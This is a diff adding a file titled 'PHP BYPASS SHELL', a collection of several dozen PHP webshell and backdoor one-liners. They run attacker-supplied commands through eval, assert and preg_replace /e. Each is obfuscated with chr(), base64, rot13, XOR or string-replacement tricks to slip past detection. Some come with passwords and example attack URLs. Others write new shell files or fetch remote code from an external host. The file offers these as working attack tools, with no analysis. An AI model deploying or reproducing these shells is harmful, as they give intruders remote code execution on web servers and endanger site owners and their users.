@@ -1,0 +1,270 @@
+======================================================
+||                PHP BYPASS SHELL                  ||
+======================================================
+
+----------------------------------------
+<?php $_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?>
+pass:1
+----------------------------------------
+<?=eval($_POST[0]);?> 
+----------------------------------------
+<?
+@$_[]=@! _; $__=@${_}>>$_;$_[]=$__;$_[]=@_;$_[((  $__) ($__   ))].=$_;
+$_[]=  $__; $_[]=$_[--$__][$__>>$__];$_[$__].=(($__ $__)  $_[$__-$__]).($__ $__ $__) $_[$__-$__];
+$_[$__ $__] =($_[$__][$__>>$__]).($_[$__][$__]^$_[$__][($__<<$__)-$__] );
+$_[$__ $__] .=($_[$__][($__<<$__)-($__/$__)])^($_[$__][$__] );
+$_[$__ $__] .=($_[$__][$__ $__])^$_[$__][($__<<$__)-$__ ];
+$_=$ 
+$_[$__  $__] ;$_[@-_]($_[@! _] );
+//http://target.com/shell.php?0=system&1=ls
+?>
+----------------------------------------
+<?php
+$_="{"; 
+$_=($_^"<").($_^">;").($_^"/");
+?>
+<?=${'_'.$_}["_"](${'_'.$_}["__"]);
+//http://target.com/shell.php?_=system&__=ls
+?>
+----------------------------------------
+<?php
+echo preg_filter('|.*|e', $_REQUEST['pass'], '');
+?>
+----------------------------------------
+<?php
+mb_ereg_replace('.*', $_REQUEST['pass'], '', 'e');
+?>
+----------------------------------------
+<?php
+var_dump($_SERVER);
+var_dump(file_put_contents($_GET['z'], $_GET['x']));
+var_dump(scandir($_GET['b']));
+var_dump(file_get_contents($_GET['c']));
+?>
+----------------------------------------
+<?php
+$config= trim($_POST['43cb006424cbf7b46dbca36c8ed79b69']);
+$info = string2array($config);
+function string2array($data) {
+if($data == '') return array();
+@eval("\$array = $data;");
+return $array;
+}
+?>
+----------------------------------------
+<script language="php">@fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='));</script>
+----------------------------------------
+<?php fputs(fopen(pack("H*","6c6f7374776f6c662e706870"),"w"),pack("H*","3c3f406576616c28245f504f53545b6c6f7374776f6c665d293f3e"))?>
+----------------------------------------
+<?php @fputs(fopen(base64_decode('bG9zdC5waHA='),w),base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWydsb3N0d29sZiddKTs/Pg=='));?>
+----------------------------------------
+?JFIF 
+<?php @eval($_POST['dnthirteen']);?>
+----------------------------------------
+<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('Status:404');Else/**/$K($M);?>
+----------------------------------------
+<?php @preg_replace("//e",$_POST[x],"e");exit("|LO|"); ?>
+----------------------------------------
+<?php array_map("ass\x65rt",(array)$_REQUEST['test']);?>
+----------------------------------------
+<?php $item['wind'] = 'assert';$array[] = $item;$array[0]['wind']($_POST['whirlwind']);?>
+----------------------------------------
+<?php if(isset($_POST["f4ck"])){$a=strrev("edoced_46esab");eval($a($_POST[z0]));}?>
+----------------------------------------
+<?php if(md5($_GET['pass'])=='21232f297a57a5a743894a0e4a801fc3'){eval($_POST[console]);}else{die('fuck off!');}?>
+----------------------------------------
+<?php
+eval(gzinflate(base64_decode('s7ezsS/IKFBwSC1LzNFQiQ/wDw6JVlcpL9a1CyrNU4/VtE7OyM1PUQBKBbsGhbkGRSsFOwd5BoTEu3n6uPo5+roqxeoYmJiYaFrbA40CAA==')));
+?>
+----------------------------------------
+<?php
+	$fatezero	= "SABERBERSERKER(\$LANCERPCASTEROSTCASTERARCHERCASTER'faCASTERtASSASSINzCASTERASSASSINCASTERro'RIDER)GINTAMA";
+	$fatestaynight	= str_replace("CASTER", "", $fatezero);
+	$fatezero	= str_replace("LANCER", "_", $fatestaynight);
+	$fatestaynight	= str_replace("SABER", "ev", $fatezero);
+	$fatezero	= str_replace("BERSERKER", "al", $fatestaynight);
+	$fatestaynight	= str_replace("RIDER", "]", $fatezero);
+	$fatezero	= str_replace("GINTAMA", ";", $fatestaynight);
+	$fatestaynight	= str_replace("ARCHER", "[", $fatezero);
+	$fatezero	= str_replace("ASSASSIN", "e", $fatestaynight);
+
+	if($fatestaynight !== $fatezero)
+	{
+		eval($fatezero);
+	}
+?> 
+----------------------------------------
+<?php
+$p=realpath(dirname(__FILE__)."/").$_GET["a"];
+$t=$_GET["b"];
+$tt="";
+for ($i=0;$i<strlen($t);$i+=2) $tt.=urldecode("%".substr($t,$i,2));
+@fwrite(fopen($p,"w"),$tt);
+echo "success!";
+?>
+----------------------------------------
+<?php $s=@$_GET[2];if(md5($s.$s)=="e67c2597ecad64bb4cdad6633b04107f")@eval($_REQUEST[$s]); ?>
+----------------------------------------
+<?php $k="ass"."ert"; $k(${"_PO"."ST"} ['k8']);?>
+----------------------------------------
+<?php ob_clean();ini_set("max_execution_time",0);passthru($_GET["cmd"]);die;?>
+----------------------------------------
+<?php $mujj = $_POST['z'];if ($mujj!=""){$xsser=base64_decode($_POST['z0']);@eval("\$safedg = $xsser;");}?>
+----------------------------------------
+<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>
+----------------------------------------
+<?php preg_replace("/^/e",base64_decode($_REQUEST[g]),0);?>
+----------------------------------------
+<?php fputs(fopen("./shell.php","w"),"<?eval(\$_POST[a]);?>")?>
+----------------------------------------
+<?php if($_POST[admin]){assert($_POST[admin]);}else{phpinfo();}?>
+----------------------------------------
+<?php ($www= $_POST['ice']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($www)','add');?>
+----------------------------------------
+<?php ($_=@$_GET[2]).@$_($_POST[1])?>
+dnthirteen: http://site/1.php?2=assert Password: 1
+----------------------------------------
+<?php $K=sTr_RepLaCe('`','','a`s`s`e`r`t');$M=$_POST[ice];IF($M==NuLl)HeaDeR('Status:404');Else/**/$K($M);?>
+----------------------------------------
+<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_uU(40).$_uU(36).$_uU(95).$_uU(80).$_uU(79).$_uU(83).$_uU(84).$_uU(91).$_uU(49).$_uU(93).$_uU(41).$_uU(59);$_fF=$_uU(99).$_uU(114).$_uU(101).$_uU(97).$_uU(116).$_uU(101).$_uU(95).$_uU(102).$_uU(117).$_uU(110).$_uU(99).$_uU(116).$_uU(105).$_uU(111).$_uU(110);$_=$_fF("",$_cC);@$_();?>
+Password: 1
+----------------------------------------
+<?php
+$a[1] = 'a';
+$a[2] = 's';
+$a[3] = 's';
+$a[4] = 'e';
+$a[5] = 'r';
+$a[6] = 't';
+$i = 0;
+$n = 6;
+while ($i <= $n)
+{
+  $t =$t.$a[$i];
+  $i =$i+1;
+}
+$t($_POST[sb]);
+?>
+----------------------------------------
+<?
+$__C_C="WlhaaGJDZ2tYMUJQVTFSYmVGMHBPdz09";
+$__P_P="abcdefghijklmnopqrstuvwxyz";
+$__X_X="123456789";
+$__O_O=$__X_X[5].$__X_X[3]."_";
+$__B_B=$__P_P{1}.$__P_P[0].$__P_P[18].$__P_P[4];
+$__H_H=$__B_B.$__O_O.$__P_P[3].$__P_P[4].$__P_P[2].$__P_P[14].$__P_P[3].$__P_P[4];
+$__E_E=$__P_P[4].$__P_P[21].$__P_P[0].$__P_P[11];
+$__F_F=$__P_P[2].$__P_P[17].$__P_P[4].$__P_P[0].$__P_P[19].$__P_P[4];
+$__F_F.='_'.$__P_P[5].$__P_P[20].$__P_P[13].$__P_P[2].$__P_P[19].$__P_P[8].$__P_P[14].$__P_P[13];
+$_[00]=$__F_F('$__S_S',$__E_E.'("$__S_S");');
+@$_[00]($__H_H($__H_H($__C_C)));
+?>
+----------------------------------------
+<?php
+error_reporting(0);
+session_start();
+header("Content-type:text/html;charset=utf-8");
+if(empty($_SESSION['api']))
+$_SESSION['api']=substr(file_get_contents(sprintf('%s?%s',pack("H*",'687474703a2f2f377368656c6c2e676f6f676c65636f64652e636f6d2f73766e2f6d616b652e6a7067'),uniqid())),3649);
+@preg_replace("~(.*)~ies",gzuncompress($_SESSION['api']),null);
+?>
+----------------------------------------
+<?php
+$x=~Ÿ¬¬º­«;
+$x($_POST[~¹¹ÏÏÏÏ]);
+?>
+Password: FF0000
+----------------------------------------
+<?php
+$hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
+$hh("/[discuz]/e",$_POST['h'],"Access");
+?>
+----------------------------------------
+<?php
+$user="63a9f0ea7bb98050796b649e85481845"; 
+$pass="7b24afc8bc80e548d66c4e7ff72171c5"; 
+
+if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)
+{eval($_GET['idc']);}
+?>
+---------------------------------------
+<?php
+$func = new ReflectionFunction($_GET[m]);
+echo $func->invokeArgs(array($_GET[c],$_GET[id]));
+?>
+
+----------------------------------------
+<?php assert($_POST[sb]);
+echo '<script language="php">@eval($_POST[sb])</script>';
+?>
+----------------------------------------
+<?php eval($_POST[xiaoma]);?>
+----------------------------------------
+<?php $_GET['ts7']($_POST['cmd']);
+?>
+----------------------------------------
+<?php
+@$_="s"."s"./*-/*-*/"e"./*-/*-*/"r";
+@$_=/*-/*-*/"a"./*-/*-*/$_./*-/*-*/"t";
+@$_/*-/*-*/($/*-/*-*/{"_P"./*-/*-*/"OS"./*-/*-*/"T"}
+[/*-/*-*/0/*-/*-*/-/*-/*-*/2/*-/*-*/-/*-/*-*/5/*-/*-*/]); // Password: -7
+?>
+----------------------------------------
+<?fputs(fopen("test.php","w"),'<?php eval($_POST["cmd"]);?>');?>
+----------------------------------------
+<?php
+error_reporting(0);
+set_time_limit(0);
+function decrypt($ciphertext_hex,$key){
+$key=md5($key);
+$iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_128, MCRYPT_MODE_CBC);
+$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
+$ciphertext_dec = pack("H*",$ciphertext_hex);
+$iv_dec = substr($ciphertext_dec, 0, $iv_size);
+$ciphertext_dec = substr($ciphertext_dec, $iv_size);
+$plaintext_dec = mcrypt_decrypt(MCRYPT_RIJNDAEL_128, $key,$ciphertext_dec, MCRYPT_MODE_CBC, $iv_dec);
+return trim($plaintext_dec);
+}
+if(@$_REQUEST['key']){
+$key=$_REQUEST['key'];
+$hash='bd40dd58f44adc5c334e53418ea1bcd591521d60662c6753b89dc46bb02b1ecb02bf857eaa0ea5d5a36ecf638d65c55eb9a8f2b17ceb2d740e3eba7792d3995b7d4fdbdf9f5f90b219cf955539b169a40109ff496262cbc21050e6993d1f9a6a678990e0b01a03617dd4b38358d78e9a67eabe8b288487a96ca55a94e8d6614a';
+$shellcode='12ec445a8c4be78007d08367455c60d571c3509ba62d1f2b321fa824667345ff3131b02b81c8ad646ffc3360e60d19d3f7f43b7b21f5bca05d6e7abfc2461b5d72fffb22659aa08655cdd8734baa0fd47b93a5659348954f853d3a68022fb3422a3832efa04792c1a81680e5aa8081716f169e05afb332a26fbd0f76ae8905b9a068ddb54f3ae107ba673362835951f4953db1079b6a3c0b4eb20ca96a241936244947ee67e0d563d8b2eee439cc5ba21151ae520eec0a663f092f9845918c7d6630764dad77808e376e099008403b01c491399da5cb3c8926c29b1bf89e8c751fb33a850c608b20e4c41cf28ec8b8060a30a827b43cd301d9c587863ce39f2326345a0217110fc898acb6c3343f3ce8';
+eval(decrypt($hash,$key));
+}else{
+echo 'ERROR!';
+}
+
+?>
+----------------------------------------
+<?php
+function getMd5($md5 = null) {
+    $key = substr(md5($md5),26);
+    return $key; }
+    $array = array(
+      chr(112).chr(97).chr(115).chr(115),
+      chr(99).chr(104).chr(101).chr(99).chr(107),
+      chr(99).chr(52).chr(53).chr(49).chr(99).chr(99)
+    );
+    if ( isset($_POST) ) $request = &$_POST;
+    elseif ( isset($_REQUEST) )  $request = &$_REQUEST;
+    if ( isset($request[$array[0]]) && isset($request[$array[1]]) ) {
+      if ( getMd5($request[$array[0]]) == $array[2] ) {
+        $token = preg_replace (
+        chr(47) . $array[2] . chr(47) . chr(101),
+        $request[$array[1]],
+        $array[2]
+      );
+    }
+}
+?>
+----------------------------------------
+<?php $item['wind'] = 'assert'; $array[] = $item; $array[0]['wind']($_POST['hkwwj']);?>
+----------------------------------------
+<?php
+$qajd2="VDFOVVd5";$vvnr1="UUdWMllX";$hitq5="d29KRjlR";$itfh2="ZGtabmg2Y1RRblhTazc=";
+$akmi4 = str_replace("eu2","","eu2seu2teu2reu2_reu2eeu2pleu2aeu2ce");
+$hygg4 = $akmi4("so0", "", "so0baso0sso0e6so04so0_so0dso0eso0cso0oso0dso0e");
+$gzsw5 = $akmi4("qik6","","qik6cqik6reqik6atqik6eqik6_fqik6uncqik6tqik6ioqik6n");
+$foxl6 = $gzsw5('', $hygg4($hygg4($akmi4("$;*,.", "", $vvnr1.$hitq5.$qajd2.$itfh2)))); $foxl6();
+?>
+----------------------------------------
